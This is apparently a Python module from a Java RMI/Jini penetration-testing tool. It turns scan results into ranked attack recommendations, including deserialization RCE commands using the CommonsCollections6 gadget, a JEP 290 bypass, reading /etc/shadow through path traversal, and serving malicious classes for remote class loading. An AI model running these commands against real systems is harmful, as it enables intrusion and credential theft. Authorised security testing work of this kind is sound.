"""Exploitation assessment — combines all enumeration signals into
actionable attack recommendations.

After running ``jini scan`` the tool collects:

1. **SUID version hints** — discriminating entries pin JDK ≤ 8 vs 9+
2. **DGC JEP 290 probe** — tells us if DGC deserialization is filtered
3. **Namespace analysis** — ``com.sun.jini.*`` vs ``org.apache.river.*``
4. **Codebase server state** — directory listing, path traversal, class files

This module cross-references those signals and produces a prioritised
list of attack vectors with severity ratings, so the pentester knows
exactly what to try next.
"""

from __future__ import annotations

from dataclasses import dataclass, field
from typing import Any


# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------

RISK_CRITICAL = "CRITICAL"
RISK_HIGH = "HIGH"
RISK_MEDIUM = "MEDIUM"
RISK_LOW = "LOW"
RISK_INFO = "INFO"

# Ordered severity for sorting
_SEVERITY_ORDER = {
    RISK_CRITICAL: 0,
    RISK_HIGH: 1,
    RISK_MEDIUM: 2,
    RISK_LOW: 3,
    RISK_INFO: 4,
}


# ---------------------------------------------------------------------------
# Result dataclass
# ---------------------------------------------------------------------------

@dataclass
class AttackVector:
    """A single actionable attack vector."""
    title: str
    severity: str  # CRITICAL / HIGH / MEDIUM / LOW / INFO
    detail: str
    action: str  # recommended javapwner command or manual step

    def to_dict(self) -> dict[str, str]:
        return {
            "title": self.title,
            "severity": self.severity,
            "detail": self.detail,
            "action": self.action,
        }


@dataclass
class ExploitAssessment:
    """Combined exploitation assessment for a Jini target."""

    # Overall risk
    risk_level: str = RISK_INFO

    # Estimated JDK version
    jdk_estimate: str = "unknown"
    jdk_confidence: str = "none"  # "high", "medium", "low", "none"

    # Framework identification
    framework: str = "unknown"  # "Sun Jini 2.x", "Apache River 3.x", etc.

    # DGC state
    dgc_state: str = "unknown"  # "unfiltered", "filtered", "unreachable", "unknown"

    # Codebase state
    codebase_accessible: bool = False
    codebase_traversal: bool = False
    codebase_classes_found: bool = False

    # Attack vectors (sorted by severity)
    vectors: list[AttackVector] = field(default_factory=list)

    def to_dict(self) -> dict[str, Any]:
        return {
            "risk_level": self.risk_level,
            "jdk_estimate": self.jdk_estimate,
            "jdk_confidence": self.jdk_confidence,
            "framework": self.framework,
            "dgc_state": self.dgc_state,
            "codebase_accessible": self.codebase_accessible,
            "codebase_traversal": self.codebase_traversal,
            "codebase_classes_found": self.codebase_classes_found,
            "vectors": [v.to_dict() for v in self.vectors],
        }


# ---------------------------------------------------------------------------
# Assessment builder
# ---------------------------------------------------------------------------

def assess_exploitation(
    *,
    version_hints: list[dict[str, str]] | None = None,
    dgc_reachable: bool = False,
    jep290_active: bool | None = None,
    class_names: list[str] | None = None,
    codebase_results: list[dict[str, Any]] | None = None,
    proxy_interfaces: list[str] | None = None,
    target: str = "",
    port: int = 4160,
) -> ExploitAssessment:
    """Build a prioritised exploitation assessment.

    Parameters
    ----------
    version_hints:
        Output of ``fingerprint_java_version()``.
    dgc_reachable:
        Whether the DGC endpoint responded to JRMP handshake.
    jep290_active:
        ``True`` = JEP 290 filter detected, ``False`` = unfiltered,
        ``None`` = unknown.
    class_names:
        All class names extracted from the serial stream.
    codebase_results:
        List of ``CodebaseExploreResult.to_dict()`` dicts.
    proxy_interfaces:
        Interface names from the Jini proxy (dynamic proxy classes).
    target, port:
        For generating recommended commands.
    """
    version_hints = version_hints or []
    class_names = class_names or []
    codebase_results = codebase_results or []
    proxy_interfaces = proxy_interfaces or []

    a = ExploitAssessment()
    vectors: list[AttackVector] = []
    cmd_base = f"javapwner jini"
    t_flag = f"-t {target} -p {port}" if target else "-t TARGET"

    # ──────────────────────────────────────────────────────────────────────
    # 1. JDK version estimation from discriminating SUIDs
    # ──────────────────────────────────────────────────────────────────────
    jdk_pre9 = False
    jdk_post9 = False

    for hint in version_hints:
        if hint.get("discriminating") != "True":
            continue
        h = hint["hint"].lower()
        if "jdk ≤ 8" in h or "jdk 1.2 – 8" in h or "pre-jep 290" in h:
            jdk_pre9 = True
        elif "jdk 9+" in h or "jdk 9" in h:
            jdk_post9 = True

    if jdk_pre9 and not jdk_post9:
        a.jdk_estimate = "JDK ≤ 8 (pre-JEP 290)"
        a.jdk_confidence = "high"
    elif jdk_post9 and not jdk_pre9:
        a.jdk_estimate = "JDK 9+"
        a.jdk_confidence = "high"
    elif jdk_pre9 and jdk_post9:
        a.jdk_estimate = "conflicting signals (mixed JDK classes)"
        a.jdk_confidence = "low"
    else:
        # No discriminating SUIDs — try namespace heuristics
        a.jdk_confidence = "low"

    # ──────────────────────────────────────────────────────────────────────
    # 2. Framework identification from class namespaces
    # ──────────────────────────────────────────────────────────────────────
    has_sun_jini = any("com.sun.jini" in c for c in class_names)
    has_river = any("org.apache.river" in c for c in class_names)

    if has_sun_jini and not has_river:
        a.framework = "Sun Jini 2.x (pre-Apache donation)"
        if a.jdk_confidence == "low":
            a.jdk_estimate = "likely JDK ≤ 8 (Sun Jini era)"
            a.jdk_confidence = "medium"
    elif has_river and not has_sun_jini:
        a.framework = "Apache River 3.x"
    elif has_river and has_sun_jini:
        a.framework = "Apache River 2.x (transitional namespace)"
    elif any("net.jini" in c for c in class_names):
        a.framework = "Jini-compatible (net.jini namespace)"
    else:
        a.framework = "unknown"

    # ──────────────────────────────────────────────────────────────────────
    # 3. DGC deserialization state
    # ──────────────────────────────────────────────────────────────────────
    if not dgc_reachable:
        a.dgc_state = "unreachable"
    elif jep290_active is True:
        a.dgc_state = "filtered"
    elif jep290_active is False:
        a.dgc_state = "unfiltered"
    else:
        a.dgc_state = "unknown"

    # ──────────────────────────────────────────────────────────────────────
    # 4. Codebase state
    # ──────────────────────────────────────────────────────────────────────
    for cb in codebase_results:
        if cb.get("server_reachable"):
            a.codebase_accessible = True
        if cb.get("traversal_vulnerable"):
            a.codebase_traversal = True
        if cb.get("downloaded_classes"):
            a.codebase_classes_found = True

    # ──────────────────────────────────────────────────────────────────────
    # 5. Build attack vectors
    # ──────────────────────────────────────────────────────────────────────

    # --- RCE via DGC deserialization (the big one) ---
    if jep290_active is False and dgc_reachable:
        vectors.append(AttackVector(
            title="RCE via DGC deserialization",
            severity=RISK_CRITICAL,
            detail=(
                "DGC endpoint accepts arbitrary objects (JEP 290 NOT active). "
                "Any ysoserial gadget chain matching the target's classpath "
                "will achieve Remote Code Execution."
            ),
            action=f"{cmd_base} exploit {t_flag} --gadget CommonsCollections6 --cmd 'id'",
        ))
    elif jep290_active is True and dgc_reachable:
        # JEP 290 active on DGC — still try An Trinh bypass on registry
        vectors.append(AttackVector(
            title="DGC filtered (JEP 290) — try registry bypass",
            severity=RISK_MEDIUM,
            detail=(
                "DGC endpoint filters deserialization (JEP 290 active). "
                "However, the RMI Registry and application-level endpoints "
                "may still be vulnerable.  An Trinh's JEP 290 bypass "
                "(CVE-2019-2684) works on JDK ≤ 11.0.2."
            ),
            action=(
                f"# Try An Trinh bypass with rmg or ysoserial-modified:\n"
                f"# rmg serial {target} {port} CommonsCollections6 'id' --component reg"
            ),
        ))

    # --- RCE likelihood from JDK version ---
    if a.jdk_estimate.startswith("JDK ≤ 8") and a.dgc_state == "unknown":
        vectors.append(AttackVector(
            title="JDK ≤ 8 detected — DGC likely unfiltered",
            severity=RISK_HIGH,
            detail=(
                "MarshalledObject SUID confirms JDK ≤ 8. JEP 290 was only "
                "backported to JDK 8u121 / 7u131 / 6u141.  Unless the target "
                "is patched to those specific updates, DGC deserialization "
                "is wide open."
            ),
            action=f"{cmd_base} exploit {t_flag} --gadget CommonsCollections6 --cmd 'id'",
        ))

    # --- Sun Jini namespace → old deployment ---
    if has_sun_jini:
        vectors.append(AttackVector(
            title="Sun Jini 2.x namespace — legacy deployment",
            severity=RISK_HIGH,
            detail=(
                "Classes use com.sun.jini.* namespace (pre-Apache donation, "
                "circa 2007).  This strongly suggests the service has not been "
                "updated in years.  It almost certainly runs on JDK ≤ 8 without "
                "JEP 290 and is vulnerable to DGC deserialization attacks."
            ),
            action=f"{cmd_base} exploit {t_flag} --gadget CommonsCollections6 --cmd 'id'",
        ))

    # --- Codebase path traversal ---
    if a.codebase_traversal:
        vectors.append(AttackVector(
            title="Arbitrary file read via codebase path traversal",
            severity=RISK_HIGH,
            detail=(
                "The HTTP codebase server is vulnerable to path traversal. "
                "Arbitrary files can be read from the target filesystem, "
                "including /etc/shadow, SSH keys, and application configs."
            ),
            action=f"{cmd_base} read-file {t_flag} --path /etc/shadow",
        ))

    # --- Codebase accessible (directory listing) ---
    if a.codebase_accessible and not a.codebase_traversal:
        vectors.append(AttackVector(
            title="HTTP codebase server accessible",
            severity=RISK_MEDIUM,
            detail=(
                "The codebase HTTP server is reachable and may expose "
                "directory listings, .class files, and application JARs. "
                "Class files reveal interface methods available for "
                "deserialization attacks."
            ),
            action=f"{cmd_base} scan {t_flag}  # classes are downloaded automatically",
        ))

    # --- Remote class loading (codebase + pre-JDK 7u21) ---
    if a.codebase_accessible and (
        a.jdk_estimate.startswith("JDK ≤ 8") or has_sun_jini
    ):
        vectors.append(AttackVector(
            title="Remote class loading (codebase attack)",
            severity=RISK_MEDIUM,
            detail=(
                "Before JDK 7u21, java.rmi.server.useCodebaseOnly defaults "
                "to false, allowing an attacker to specify a malicious "
                "codebase URL so the server loads attacker-controlled classes. "
                "Given the old JDK, this may apply."
            ),
            action=(
                "# Host a malicious class on attacker HTTP server:\n"
                "# python3 -m http.server 8888\n"
                "# Then trigger class loading via RMI call with "
                "annotation URL pointing to attacker."
            ),
        ))

    # --- Class file analysis for method guessing ---
    if a.codebase_classes_found:
        vectors.append(AttackVector(
            title="Interface methods extracted — method guessing possible",
            severity=RISK_LOW,
            detail=(
                "Downloaded .class files from the codebase reveal Remote "
                "interface method signatures.  These can be used for method "
                "guessing attacks if the interfaces accept Object or "
                "non-primitive arguments (deserialization at application level)."
            ),
            action=(
                "# Check the scan output for interface methods.\n"
                "# Look for methods accepting Object, Map, or Serializable.\n"
                "# Use rmg guess or a custom RMI client."
            ),
        ))

    # --- Proxy interfaces of interest ---
    interesting_ifaces = [
        i for i in proxy_interfaces
        if any(k in i.lower() for k in (
            "remote", "space", "transaction", "activation",
            "registrar", "admin", "destroyable",
        ))
    ]
    if interesting_ifaces and not a.codebase_classes_found:
        vectors.append(AttackVector(
            title=f"Interesting proxy interfaces: {', '.join(interesting_ifaces[:3])}",
            severity=RISK_INFO,
            detail=(
                "The Jini proxy implements interfaces that may expose "
                "additional attack surface (method invocation, administration, "
                "JavaSpace operations)."
            ),
            action="# Investigate these interfaces for exploitable methods.",
        ))

    # --- If nothing specific, but JRMP is open ---
    if not vectors and dgc_reachable:
        vectors.append(AttackVector(
            title="JRMP endpoint open — attempt exploitation",
            severity=RISK_MEDIUM,
            detail=(
                "A JRMP endpoint is accessible.  Without more information "
                "about JEP 290 status, attempt exploitation with common "
                "gadget chains."
            ),
            action=f"{cmd_base} exploit {t_flag} --gadget CommonsCollections6 --cmd 'id'",
        ))

    # Sort by severity
    vectors.sort(key=lambda v: _SEVERITY_ORDER.get(v.severity, 99))
    a.vectors = vectors

    # Set overall risk to the highest-severity vector
    if vectors:
        a.risk_level = vectors[0].severity
    else:
        a.risk_level = RISK_INFO

    return a
